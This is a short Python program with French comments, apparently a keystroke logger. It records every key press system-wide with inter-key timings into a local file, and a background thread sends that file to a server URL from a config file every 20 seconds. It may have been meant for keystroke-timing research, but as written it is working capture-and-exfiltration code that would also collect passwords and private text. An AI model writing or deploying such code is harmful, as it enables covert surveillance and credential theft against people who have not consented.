
# Modules python
import keyboard
import time
import sys
import os
import json
import threading

# Fichiers locaux
import sauvegarde_locale
from manipulation_string import strings_egaux
import envoie_donnees


## Global Variables


# Caractères à laisser passer que ce soit pressé ou relaché
caracteres_importants = ["shift", "alt"]

caracteres_remplacement = {
	',' : '/v',#Dictionnaire pour normaliser l'écriture
	';' : '/pv', #Ceci permet de palier aux différences de système d'exploitation
	'maj' : 'shift', #Et d'éviter des conflits avec le csv
	'right shift' : 'shift',
	'caps lock' : 'verr.maj',
	'backspace' : 'delete',
	'\'' : '/a',
	'\"' : '/g',
	'gauche' : 'left',
	'droite' : 'right',
	'haut' : 'up',
	'bas' : 'down',
	'windows gauche' : 'cmd',
	"alt gr": "alt",
  "right option" : "alt",
	"command" : "cmd"
}

# Récupère la configuration depuis le fichier config.json
dossier_courant = os.path.dirname(__file__)
chemin_config = os.path.join(dossier_courant, "config.json")

config_file = open(chemin_config)
config = json.load(config_file)
config_file.close()

chemin_sauvegarde = os.path.join(dossier_courant, config["sauvegarde_locale"])

#
#  Creations des deux threads
#
def main():
	keys = []
	start_date = time.time()
	last_date = start_date
	date_derniere_sauvegarde = time.time()
	dernier_caractere = ''

	while True:
		# Attend l'envoie d'une 
		event = keyboard.read_event()

		# Permet d'arrêter le programme
		if event.name == 'esc':
			break

		# Permet de normaliser les systèmes linux et windows
		eventname = event.name
		if event.name in caracteres_remplacement:
			eventname = caracteres_remplacement[event.name]

		# teste le cas où le caractère entré est un caractère important
		est_un_caractere_important = eventname in caracteres_importants
		# teste si le caractère est un appui long, permet de ne pas compter plusieurs shift lorsqu'on reste appuyer dessus longtemps
		# avant de tapper d'autre caractères
		est_un_appuie_long = event.event_type == keyboard.KEY_DOWN and strings_egaux(eventname, dernier_caractere)

		# permet finalement de créer la condition d'ajout du caractère important
		caracteres_importants_a_ajouter = est_un_caractere_important and not est_un_appuie_long

		# Ne considère l'évennement que si la touche est pressée
		if caracteres_importants_a_ajouter or not(est_un_caractere_important) and event.event_type == keyboard.KEY_DOWN:
			date = time.time()
			dt = date - last_date

			#print(eventname, event.event_type)

			char = eventname
			# On doit normaliser certains caractères
					# Pour éviter des problèmes de csv et de différence d'os
			if char in caracteres_remplacement :
				char = caracteres_remplacement[char]

			char.encode("utf8")

			line = f"{char},{dt}\n"
			sauvegarde_locale.sauvegarde(chemin_sauvegarde, line)
			#keys.append(item)

			last_date = date
			dernier_caractere = eventname

			# réinitialise le dernier caractère pour que l'appuie long fonctionne de nouveau
			# pour la détection des caractères spéciaux à ajouter
			if est_un_caractere_important and event.event_type == keyboard.KEY_UP:
				dernier_caractere = ''

def thread_envoie(dt=20):
	"""
		Entrée: - dt: entier, correspond à l'interval de temps entre deux envoie du fichier local au serveur,
									correspond à une durée en secondes.
	"""
	while True:
		if not os.path.exists(chemin_sauvegarde):
			open(chemin_sauvegarde, 'x').close()

		with open(chemin_sauvegarde, "r+") as fichier_sauvegarde:
			data = fichier_sauvegarde.read()
			envoie_donnees.envoie(config["url"], data)
			fichier_sauvegarde.truncate(0)
		time.sleep(dt)

if __name__ == '__main__':
	main_thread = threading.Thread(target=main)
	envoie_thread = threading.Thread(target=thread_envoie)
	main_thread.start()
	envoie_thread.start()
